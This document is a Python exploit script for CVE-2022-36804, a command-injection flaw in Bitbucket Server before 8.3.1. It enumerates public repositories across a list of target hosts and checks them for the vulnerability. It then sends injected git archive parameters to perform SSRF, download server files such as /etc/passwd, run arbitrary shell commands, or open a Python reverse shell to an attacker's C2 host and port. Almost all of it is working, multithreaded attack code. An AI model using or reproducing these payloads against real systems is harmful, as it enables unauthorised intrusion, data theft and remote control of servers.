#!/usr/bin/python3

"""
	Please ignore ugly python, was made to be a single script to do all the things
"""

import os
import sys
import time
import random
import requests
import argparse
import threading
import urllib.parse
from queue import Queue
from requests import get
from hashlib import sha256
from base64 import b64encode
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

headers = {'User-Agent': 'BitBucket-CVE-2022-36804'}
proxies = {}

verbosity = 0

payloads = {
	"check": "/%00--help%00--%00",
	"ssrf": "/%00--remote=git://{DNS_DOMAIN}%00",
	"download_file": "/%00--add-file={FILENAME}%00HEAD%00--",
	"rce": "/%00--remote=''%00--exec=echo+'{PAYLOAD}'+%7c+base64+-d++%7c+sh;%00",
	"reverse_shell": "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{SHELL_HOST}\",{SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
}

vulnerable_hash = "b4269652b5ba168552b02ece2d3ad3622e7777241d1e700a95f857933f874335"

# Global running value for threads
running = True

# Queues
message_queue = Queue()
task_queue = Queue()
return_queue = Queue()

# Task Object
class Task():
	def __init__(self,  function=None, url=None, repo=None, cmd=None, 
				 host=None, port=None, server_file=None, local_file=None, 
				 knary=None):
		self.function = function
		self.url = url
		self.repo = repo
		self.cmd = cmd
		self.host = host
		self.port = port
		self.server_file = server_file
		self.local_file = local_file
		self.knary = knary

# Message Object
class Message():
	def __init__(self, message="", stream="err", verbosity=0, exit=False):
		self.message = message
		self.stream = stream if stream in ('err', 'std') else 'err'
		self.verbosity = int(verbosity)
		self.exit = exit


# Logging Thread
class Logging(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.daemon = True
	def eprint(self,*args,**kwargs):
		print(*args,file=sys.stderr,**kwargs)
	def run(self):
		global message_queue, verbosity, running
		while True:
			msg = None
			try:
				msg = message_queue.get(True, timeout=5)
			except:
				if running == False:
					self.eprint(f"[*] Closing logger thread.")
					break
			if type(msg) == Message:
				# Exit handler
				if msg.exit:
					if msg.message:
						self.eprint(f"[*] {msg.message}")
					break
				# Ensure verbosity level is matched
				if msg.verbosity > verbosity:
					continue
				if msg.stream == 'err':
					self.eprint(f"[*] {msg.message}")
				elif msg.stream == 'std':
					print(f"{msg.message}")
				message_queue.task_done()
		return

# Avoid requests double encoding payloads :)
def join_params(params):
	return "&".join([f"{k}={v}" for k,v in params.items()])

def get_public_repos(url: str, *args, **kwargs):
	del(args)
	del(kwargs)
	repos = []
	public_repo_url = f"{url}/rest/api/latest/repos"
	params = {"limit":1000}
	try:
		res = get(public_repo_url, params=params, headers=headers, proxies=proxies, verify=False)
	except:
		return []
	if not (res.status_code == 200):
		return repos
	# iterate thru repos
	for repo in res.json().get('values'):
		if repo.get('public') == True:
			repos.append(
				f"{url}/rest/api/latest/projects/{repo.get('project').get('key')}/repos/{repo.get('slug')}/archive"
			)
	del(params)
	del(public_repo_url)
	del(res)
	return repos

def generate_params(payload):
	return {
		"format":"zip",
		"prefix": payload
	}

def get_random_public_repo(url: str, *args, **kwargs):
	del(args)
	del(kwargs)
	repos = get_public_repos(url)
	if len(repos) == 0:
		return None
	repo = random.choice(repos)
	del(repos)
	# Found a valid repo
	return repo

# Exploit checker, will return help of git archive if vuln
def check_exploit(repo: str, *args, **kwargs):
	del(args)
	del(kwargs)
	ret = False
	params = generate_params(payloads.get('check'))
	try:
		res = get(repo, params=join_params(params), headers=headers, proxies=proxies, verify=False)
		if "git archive" in res.text:
			if sha256(res.text.encode()).hexdigest() == vulnerable_hash:
				ret = True
				message_queue.put(Message(f"Bitbucket at {repo.split('/rest')[0]} is Vulnerable", verbosity=1))
			else:
				message_queue.put(Message(f"Bitbucket at {repo.split('/rest')[0]} is not Vulnerable", verbosity=2))
	except Exception as e:
		if str(e) != "":
			message_queue.put(Message(f"ERROR: CheckExploit ({repo.split('/rest')[0]}) - {e}", verbosity=2))
	del(params)
	del(res)
	return ret

def exploit_ssrf(repo: str, knary: str, *args, **kwargs):
	global message_queue
	del(args)
	del(kwargs)
	ret = False
	params = generate_params(payloads.get('ssrf').replace('{DNS_DOMAIN}', knary))
	try:
		get(repo, params=join_params(params), headers=headers, proxies=proxies, verify=False)
		message_queue.put(Message(f"SSRF successful to {knary} from {repo}", verbosity=2))
		ret = True
	except Exception as e:
		if str(e) != "":
			message_queue.put(Message(f"ERROR: SSRF - {e}", verbosity=1))
	del(params)
	return ret

def exploit_download_file(repo: str, server_file: str, local_file=None, *args, **kwargs):
	global message_queue
	del(args)
	del(kwargs)
	params = generate_params(payloads.get('download_file').replace('{FILENAME}', server_file))
	if local_file == None:
		local_file = f"loot_{str(int((datetime.now() - datetime(1970,1,1)).total_seconds()))}.zip"
	try:
		res = get(repo, params=join_params(params), headers=headers, proxies=proxies, verify=False)
	except Exception as e:
		if str(e) != "":
			message_queue.put(Message(f"ERROR: DOWNLOAD - {e}", verbosity=1))
		return False
	with open(local_file, "wb") as f:
		f.write(res.content)
	message_queue.put(Message(f"Wrote {server_file} to {local_file}"))
	del(params)
	del(res)
	return True

def exploit_rce(repo: str, cmd: str, *args, **kwargs):
	del(args)
	del(kwargs)
	message_queue.put(Message(f"Executing command: {cmd} on {repo}", verbosity=2))
	cmd = urllib.parse.quote_plus(b64encode(cmd.encode()))
	params = generate_params(payloads.get('rce').replace("{PAYLOAD}", cmd))
	try:
		get(repo, params=join_params(params), headers=headers, proxies=proxies, verify=False)
	except Exception as e:
		if str(e) != "":
			message_queue.put(Message(f"ERROR: RCE - {e}", verbosity=1))
		return False
	return True

def reverse_shell(repo: str, host: str, port: int, *args, **kwargs):
	del(args)
	del(kwargs)
	message_queue.put(Message(f"Spawning reverse shell to: tcp://{host}:{port} from {repo.split('/rest')[0]}"))
	port = int(port)
	payload = payloads.get('reverse_shell').replace('{SHELL_HOST}', host).replace('{SHELL_PORT}', str(port))
	exploit_rce(repo=repo, cmd=payload)
	return True

class ExploitWorker(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.daemon = True
	def run(self):
		global message_queue, task_queue, running, return_queue
		while running:
			try:
				task = task_queue.get(True, timeout=2)
				result = task.function(url=task.url, repo=task.repo, cmd=task.cmd, host=task.host,
					port=task.port, server_file=task.server_file, local_file=task.local_file, 
					knary=task.knary)
				# Handle Results into their task queues
				if task.function == get_random_public_repo:
					return_queue.put(result)
				elif task.function == check_exploit:
					return_queue.put({"repo":task.repo, "result": result})
				else:
					return_queue.put(result)
				task_queue.task_done()
				del(task)
			except Exception as e:
				if str(e) != "":
					message_queue.put(Message(f"ERROR: ExploitWorker - {e}", verbosity=2))
			continue

class ExploitHandler(threading.Thread):
	def __init__(self, limit=10):
		threading.Thread.__init__(self)
		self.daemon = True
		self.limit = limit
		self.workers = [ExploitWorker() for i in range(0,limit)]
	def run(self):
		global message_queue, task_queue, running
		[worker.start() for worker in self.workers]
		for worker in self.workers:
			worker.join()
		message_queue.put(Message("Closing Exploit Handler"))

def get_repos(urls=[]):
	global return_queue
	# Check if its an input file
	if len(urls) == 1:
		file = urls[0]
		if os.path.exists(file):
			surls = set()
			with open(file, 'r') as f:
				[surls.add(u.strip()) for u in f.readlines()]
			urls = list(surls)
			del(surls)
	repo_tasks = 0
	repos = []
	for url in urls:
		repo_tasks += 1
		random_repo_task = Task(function=get_random_public_repo, url=url)
		task_queue.put(random_repo_task)
	# Get the random repo
	repos.append(return_queue.get())
	return_queue.task_done()
	while len(repos) < repo_tasks:
		try:
			r = return_queue.get(timeout=1)
			if isinstance(r, str):
				repos.append(r)
			return_queue.task_done()
		except:
			break
	return_queue.join()
	return [repo for repo in repos if isinstance(repo, str)]

def check_exploitable(repos=[]):
	global return_queue
	checked_repos = []
	exploitable_repos = []
	for repo in repos:
		task_queue.put(Task(function=check_exploit, repo=repo))
	checked_repos.append(return_queue.get())
	return_queue.task_done()
	while len(checked_repos) < len(repos):
		checked_repos.append(return_queue.get())
		return_queue.task_done()
	return_queue.join()
	for e in checked_repos:
		if e.get('result') == True:
			exploitable_repos.append(e.get('repo'))
	return exploitable_repos

def exploit_repos(repos=[], exploit='rce', *args, **kwargs):
	global task_queue
	exploited = 1
	payload_func = None
	# define the payload to run
	if exploit == 'rce':
		payload_func = exploit_rce
		if not ('cmd' in kwargs):
			return None
	elif exploit == 'ssrf':
		payload_func = exploit_ssrf
		if not ('knary' in kwargs):
			return None
	elif exploit == 'download':
		payload_func = exploit_download_file
		if not ('server_file' in kwargs.keys()):
			return None
	elif exploit == 'rev_shell':
		payload_func = reverse_shell
		if not ({'host', 'port'} <= kwargs.keys()):
			return None
	for repo in repos:
		task_queue.put(Task(function=payload_func, repo=repo, **kwargs))
	# Wait for the exploits to be done
	_ = return_queue.get()
	while exploited < len(repos):
		_ = return_queue.get()
		exploited += 1
	return True

def exit_prog(exploit_handler, logger):
	global message_queue, running
	message_queue.put(Message("Closing threads, waiting 5 sec..."))
	running = False
	time.sleep(5)
	# Close the exploit workers
	exploit_handler.join()
	# Close logging thread
	message_queue.put(Message(exit=True))
	logger.join()

if __name__=="__main__":
	# Argument parsing: Add Proxies, authentication
	parser = argparse.ArgumentParser(prog="CVE-2022-36804.py", description="CVE-2022-36804 Exploit Script for BitBucket versions < 8.3.1")
	required = parser.add_argument_group('required arguments')
	optional = parser.add_argument_group('optional arguments')
	required.add_argument('repos', nargs='+', help="Repository host/s (http://bitbucket.example.com:7990) (or single input file \"./targets.txt\" of target hosts) to perfrom CVE-2022-36804 on")
	optional.add_argument('--auth-cookie', type=str, help="Authentication cookie 'BITBUCKETSESSIONID' value for private repositories")
	#optional.add_argument('--username', type=str, help="TODO: username to authenticate as")
	#optional.add_argument('--password', type=str, help="TODO: password for authentication")
	optional.add_argument('--proxy', type=str, help="HTTP Proxy: <http/https>://<ip>:<port>")
	optional.add_argument('-e', '--exploit', type=str, default="check", choices=['check', 'rce','ssrf','download','rev_shell'], help="Exploit to perform")
	optional.add_argument('--cmd', type=str, help="Command to execute for the 'rce' exploit (curl http://example.com)")
	optional.add_argument('--knary', type=str, help="Knary to respond too via DNS for the 'ssrf' exploit")
	optional.add_argument('--server-file', type=str, help="Server file to download for the 'download' exploit (/etc/passwd)")
	optional.add_argument('--host', type=str, help="Hostname or IP address of c2 for the 'rev_shell' exploit")
	optional.add_argument('--port', type=int, help="Port of the c2 for the 'rev_shell' exploit")
	optional.add_argument('--skip-check', action="store_true", default=False, help="Skip vulnerability checking stage")
	optional.add_argument('-t', '--threads', type=int, default=10, help="Worker Threads")
	optional.add_argument('-v', '--verbose', action="count", default=0, help="Increase output verbosity level")
	args = parser.parse_args()
	# Set verbosity
	verbosity = args.verbose
	# Set Proxy
	if args.proxy:
		proxies = {'http': args.proxy.strip(), 'https': args.proxy.strip()}
	# Authentication
	if args.auth_cookie:
		headers['Cookie'] = f"BITBUCKETSESSIONID={args.auth_cookie}"
	# Generate kwargs for exploits
	exploit_kwargs = {}
	for k,v in args.__dict__.items():
		if not (v in (False, 0, None)) and not (k in ('exploit','verbose','skip_check', 'repos', 'threads', 'auth_cookie', 'proxy')):
			exploit_kwargs[k] = v
	repos = []
	# Logging
	logger = Logging()
	logger.start()
	# Workers
	exploit_handler = ExploitHandler(limit=args.threads if args.threads < len(args.repos) else len(args.repos))
	exploit_handler.start()
	# Get public repositories, add authenticated check
	message_queue.put(Message("Obtaining public repoistories...", verbosity=1))
	repos = get_repos(args.repos)
	if len(repos) == 0:
		message_queue.put(Message("No Reposiories Found!"))
		# Exit
		exit_prog(exploit_handler, logger)
	message_queue.put(Message(f"Found {len(repos)} Reposiories"))
	message_queue.put(Message('\nObtained the following repositories:', verbosity=2))
	message_queue.put(Message('\n'.join(repos) + '\n', verbosity=2))
	# Check if vulnerable
	exploitable = repos
	if not args.skip_check:
		exploitable = check_exploitable(repos)
	# Only perform an exploit check and die
	if args.exploit == "check":
		message_queue.put(Message(f"Found {len(exploitable)} exploitable repositories"))
		message_queue.put(Message('\n'.join(exploitable), stream="std"))
		exit_prog(exploit_handler, logger)
	message_queue.put(Message(f"Found {len(exploitable)} exploitable repositories"))
	message_queue.put(Message('\nObtained the following repositories:', verbosity=1))
	message_queue.put(Message('\n' + '\n'.join(exploitable), stream="std", verbosity=1))
	# Call to exploit repos
	if not (args.exploit == "check"):
		exploit_repos(exploitable, args.exploit, **exploit_kwargs)
	# Shut down the shop
	exit_prog(exploit_handler, logger)